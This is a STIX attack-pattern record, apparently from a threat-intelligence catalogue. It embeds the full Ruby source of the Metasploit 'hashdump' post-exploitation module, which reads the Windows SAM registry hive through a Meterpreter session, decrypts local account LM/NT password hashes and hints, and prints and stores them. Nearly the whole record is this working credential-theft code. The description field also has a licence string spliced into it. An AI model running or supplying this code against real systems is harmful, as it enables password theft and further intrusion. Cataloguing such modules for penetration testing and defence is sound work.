{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--eff79735-81c3-480c-8b56-4164319ee891",
    "created": "2024-08-14T16:33:05.039135Z",
    "modified": "2024-08-14T16:33:05.039139Z",
    "name": "Windows Gather Local User Account Password Hashes (Registry)",
    "description": "This module will dump the local user accounts from the SAM database using the registry 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/hashdump.rb",
            "external_id": "hashdump.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'English'\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Registry\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Local User Account Password Hashes (Registry)',\n        'Description' => %q{ This module will dump the local user accounts from the SAM database using the registry },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'hdm' ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_registry_open_key\n            ]\n          }\n        }\n      )\n    )\n\n    # Constants for SAM decryption\n    @sam_lmpass = \"LMPASSWORD\\x00\"\n    @sam_ntpass = \"NTPASSWORD\\x00\"\n    @sam_qwerty = \"!@\\#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\\x00\"\n    @sam_numeric = \"0123456789012345678901234567890123456789\\x00\"\n    @sam_empty_lm = ['aad3b435b51404eeaad3b435b51404ee'].pack('H*')\n    @sam_empty_nt = ['31d6cfe0d16ae931b73c59d7e0c089c0'].pack('H*')\n  end\n\n  def run\n    tries = 0\n\n    begin\n      print_status('Obtaining the boot key...')\n      bootkey = capture_boot_key\n\n      print_status(\"Calculating the hboot key using SYSKEY #{bootkey.unpack('H*')[0]}...\")\n      hbootkey = capture_hboot_key(bootkey)\n\n      print_status('Obtaining the user list and keys...')\n      users = capture_user_keys\n\n      print_status('Decrypting user keys...')\n      users = decrypt_user_keys(hbootkey, users)\n\n      print_status('Dumping password hints...')\n      print_line\n      hint_count = 0\n      users.keys.sort { |a, b| a <=> b }.each do |rid|\n        # If we have a hint then print it\n        if !users[rid][:UserPasswordHint].nil? && !users[rid][:UserPasswordHint].empty?\n          print_line \"#{users[rid][:Name]}:\\\"#{users[rid][:UserPasswordHint]}\\\"\"\n          hint_count += 1\n        end\n      end\n      print_line 'No users with password hints on this system' if hint_count == 0\n      print_line\n\n      print_status('Dumping password hashes...')\n      print_line\n      print_line\n\n      # Assemble the information about the SMB service for this host\n      service_data = {\n        address: ::Rex::Socket.getaddress(session.sock.peerhost, true),\n        port: 445,\n        service_name: 'smb',\n        protocol: 'tcp',\n        workspace_id: myworkspace_id\n      }\n\n      # Assemble data about the credential objects we will be creating\n      credential_data = {\n        origin_type: :session,\n        session_id: session_db_id,\n        post_reference_name: refname,\n        private_type: :ntlm_hash\n      }\n\n      # Merge the service data into the credential data\n      credential_data.merge!(service_data)\n\n      users.keys.sort { |a, b| a <=> b }.each do |rid|\n        hashstring = \"#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack('H*')[0]}:#{users[rid][:hashnt].unpack('H*')[0]}:::\"\n\n        # Add the details for this specific credential\n        credential_data[:private_data] = users[rid][:hashlm].unpack('H*')[0] + ':' + users[rid][:hashnt].unpack('H*')[0]\n        credential_data[:username] = users[rid][:Name].downcase\n\n        # Create the Metasploit::Credential::Core object\n        credential_core = create_credential(credential_data)\n\n        # Assemble the options hash for creating the Metasploit::Credential::Login object\n        login_data = {\n          core: credential_core,\n          status: Metasploit::Model::Login::Status::UNTRIED\n        }\n\n        # Merge in the service data and create our Login\n        login_data.merge!(service_data)\n        login = create_credential_login(login_data)\n\n        print_line hashstring\n      end\n      print_line\n      print_line\n    rescue ::Interrupt\n      raise $ERROR_INFO\n    rescue ::Rex::Post::Meterpreter::RequestError => e\n      # Sometimes we get this invalid handle race condition.\n      # So let's retry a couple of times before giving up.\n      # See bug #6815\n      if (tries < 5) && e.to_s =~ (/The handle is invalid/)\n        print_status('Handle is invalid, retrying...')\n        tries += 1\n        retry\n\n      else\n        print_error(\"Meterpreter Exception: #{e.class} #{e}\")\n        print_error('This script requires the use of a SYSTEM user context (hint: migrate into service process)')\n      end\n      # rescue ::Exception => e\n      #\tprint_error(\"Error: #{e.class} #{e} #{e.backtrace}\")\n    end\n  end\n\n  def capture_hboot_key(bootkey)\n    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\\\SAM\\\\Domains\\\\Account', KEY_READ)\n    return if !ok\n\n    vf = ok.query_value('F')\n    return if !vf\n\n    vf = vf.data\n    ok.close\n\n    revision = vf[0x68, 4].unpack('V')[0]\n\n    case revision\n    when 1\n      hash = Digest::MD5.new\n      hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)\n\n      rc4 = OpenSSL::Cipher.new('rc4')\n      rc4.decrypt\n      rc4.key = hash.digest\n      hbootkey = rc4.update(vf[0x80, 32])\n      hbootkey << rc4.final\n      hbootkey\n    when 2\n      aes = OpenSSL::Cipher.new('aes-128-cbc')\n      aes.decrypt\n      aes.key = bootkey\n      aes.padding = 0\n      aes.iv = vf[0x78, 16]\n      aes.update(vf[0x88, 16]) # we need only 16 bytes\n    else\n      raise NotImplementedError, \"Unknown hboot_key revision: #{revision}\"\n    end\n  end\n\n  def capture_user_keys\n    users = {}\n    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\\\SAM\\\\Domains\\\\Account\\\\Users', KEY_READ)\n    return if !ok\n\n    ok.enum_key.each do |usr|\n      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\#{usr}\", KEY_READ)\n      next if usr == 'Names'\n\n      users[usr.to_i(16)] ||= {}\n      users[usr.to_i(16)][:F] = uk.query_value('F').data\n      users[usr.to_i(16)][:V] = uk.query_value('V').data\n\n      # Attempt to get Hints (from Win7/Win8 Location)\n      begin\n        users[usr.to_i(16)][:UserPasswordHint] = uk.query_value('UserPasswordHint').data\n      rescue ::Rex::Post::Meterpreter::RequestError\n        users[usr.to_i(16)][:UserPasswordHint] = nil\n      end\n\n      uk.close\n    end\n    ok.close\n\n    ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\Names', KEY_READ)\n    ok.enum_key.each do |usr|\n      uk = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SAM\\\\SAM\\\\Domains\\\\Account\\\\Users\\\\Names\\\\#{usr}\", KEY_READ)\n      r = uk.query_value('')\n      rid = r.type\n      users[rid] ||= {}\n      users[rid][:Name] = usr\n\n      # Attempt to get Hints (from WinXP Location) only if it's not set yet\n      if users[rid][:UserPasswordHint].nil?\n        begin\n          uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, \"SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Hints\\\\#{usr}\", KEY_READ)\n          users[rid][:UserPasswordHint] = uk_hint.query_value('').data\n        rescue ::Rex::Post::Meterpreter::RequestError\n          users[rid][:UserPasswordHint] = nil\n        end\n      end\n\n      uk.close\n    end\n    ok.close\n    users\n  end\n\n  def decrypt_user_keys(hbootkey, users)\n    users.each_key do |rid|\n      user = users[rid]\n\n      hashlm_off = user[:V][0x9c, 4].unpack('V')[0] + 0xcc\n      hashlm_len = user[:V][0xa0, 4].unpack('V')[0]\n      hashlm_enc = user[:V][hashlm_off, hashlm_len]\n\n      hashnt_off = user[:V][0xa8, 4].unpack('V')[0] + 0xcc\n      hashnt_len = user[:V][0xac, 4].unpack('V')[0]\n      hashnt_enc = user[:V][hashnt_off, hashnt_len]\n\n      user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass, @sam_empty_lm)\n      user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass, @sam_empty_nt)\n    end\n\n    users\n  end\n\n  def decode_windows_hint(e_string)\n    d_string = ''\n    e_string.scan(/..../).each do |chunk|\n      bytes = chunk.scan(/../)\n      d_string += (bytes[1] + bytes[0]).to_s.hex.chr\n    end\n    d_string\n  end\n\n  def rid_to_key(rid)\n    s1 = [rid].pack('V')\n    s1 << s1[0, 3]\n\n    s2b = [rid].pack('V').unpack('C4')\n    s2 = [s2b[3], s2b[0], s2b[1], s2b[2]].pack('C4')\n    s2 << s2[0, 3]\n\n    [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]\n  end\n\n  def decrypt_user_hash(rid, hbootkey, enchash, pass, default)\n    revision = enchash[2, 2].unpack('v')[0]\n\n    case revision\n    when 1\n      if enchash.length < 20\n        return default\n      end\n\n      md5 = Digest::MD5.new\n      md5.update(hbootkey[0, 16] + [rid].pack('V') + pass)\n\n      rc4 = OpenSSL::Cipher.new('rc4')\n      rc4.decrypt\n      rc4.key = md5.digest\n      okey = rc4.update(enchash[4, 16])\n    when 2\n      if enchash.length < 40\n        return default\n      end\n\n      aes = OpenSSL::Cipher.new('aes-128-cbc')\n      aes.decrypt\n      aes.key = hbootkey[0, 16]\n      aes.padding = 0\n      aes.iv = enchash[8, 16]\n      okey = aes.update(enchash[24, 16]) # we need only 16 bytes\n    else\n      print_error(\"Unknown user hash revision: #{revision}\")\n      return default\n    end\n\n    des_k1, des_k2 = rid_to_key(rid)\n\n    d1 = OpenSSL::Cipher.new('des-ecb')\n    d1.decrypt\n    d1.padding = 0\n    d1.key = des_k1\n\n    d2 = OpenSSL::Cipher.new('des-ecb')\n    d2.decrypt\n    d2.padding = 0\n    d2.key = des_k2\n\n    d1o = d1.update(okey[0, 8])\n    d1o << d1.final\n\n    d2o = d2.update(okey[8, 8])\n    d1o << d2.final\n    d1o + d2o\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}